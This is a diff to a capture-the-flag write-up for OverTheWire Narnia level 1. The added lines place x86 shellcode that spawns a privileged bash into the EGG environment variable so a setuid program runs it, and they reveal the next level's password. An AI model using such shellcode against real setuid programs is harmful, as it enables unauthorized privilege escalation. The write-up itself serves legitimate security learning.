@@ -52,8 +52,23 @@ int main(){
 
 I already know this form of `int (*ret)();`, it's a **pointer** to function. Because the `getenv` function returns an address (to the contents of `EGG`, actually to some string), we'll want to make `EGG` a type of memory pointer that prints the password.
 
+So I looked for [**shellcode**](https://www.sentinelone.com/blog/malicious-input-how-hackers-use-shellcode/) to run bash and found [this](https://shell-storm.org/shellcode/files/shellcode-606.html).
+
+![](0.png)
+
+I then looked for a way to put hexadecimal bytes into an environment variable and found the answer [here](https://www.linuxquestions.org/questions/linux-general-1/how-to-export-special-characters-into-environment-variables-457813/). I made sure that there is no `\x00` in the shellcode, and that's all:
+
+```
+export EGG=$'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'
+```
+```
+./narnia1
+```
+
+![](1.png)
+
 
 ## Password for the next level:
 ```
-
+Zzb6MIyceT
 ```
